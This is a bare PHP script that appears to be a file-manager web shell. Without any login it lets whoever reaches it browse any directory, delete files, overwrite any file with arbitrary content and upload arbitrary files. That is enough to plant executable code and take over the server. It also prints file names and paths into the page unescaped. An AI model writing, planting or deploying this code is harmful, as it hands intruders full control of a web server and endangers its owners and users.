<?php
$path = isset($_GET['path']) ? $_GET['path'] : '.';
$fullPath = realpath($path);

// Handle delete
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_file($target)) {
        unlink($target);
    } elseif (is_dir($target)) {
        rmdir($target); // only works on empty dirs
    }
    header("Location: ?path=" . urlencode(dirname($target)));
    exit;
}

// File editor
if (isset($_GET['edit'])) {
    $editFile = $_GET['edit'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $f = @fopen($editFile, 'w');
        if ($f) {
            fwrite($f, $_POST['content']);
            fclose($f);
            echo "<p>Saved.</p><a href='?path=" . urlencode(dirname($editFile)) . "'>Back</a>";
        } else {
            echo "<p>Failed to save file.</p>";
        }
        exit;
    }
    $content = @file_get_contents($editFile);
    $data = htmlspecialchars($content ? $content : '', ENT_QUOTES, 'UTF-8');
    echo "<h2>Editing: $editFile</h2>
    <form method='post'>
    <textarea name='content' rows='25' cols='100'>$data</textarea><br>
    <button type='submit'>Save</button>
    </form>";
    exit;
}

// Upload
if (isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $fullPath . '/' . $_FILES['upload']['name']);
    header("Location: ?path=" . urlencode($path));
    exit;
}

echo "<h2>Browsing: $fullPath</h2>";
echo "<form method='post' enctype='multipart/form-data'>
    <input type='file' name='upload'>
    <button type='submit'>Upload</button>
</form>";

echo "<ul>";
if ($handle = opendir($fullPath)) {
    while (false !== ($entry = readdir($handle))) {
        if ($entry === '.') continue;
        $filePath = $fullPath . DIRECTORY_SEPARATOR . $entry;
        $urlPath = urlencode($filePath);
        $delLink = "<a href='?delete=$urlPath' onclick=\"return confirm('Delete $entry?')\">delete</a>";
        if (is_dir($filePath)) {
            echo "<li>[<a href='?path=$urlPath'>$entry</a>] - $delLink</li>";
        } else {
            echo "<li>$entry - <a href='?edit=$urlPath'>edit</a> | $delLink</li>";
        }
    }
    closedir($handle);
}
echo "</ul>";
?>
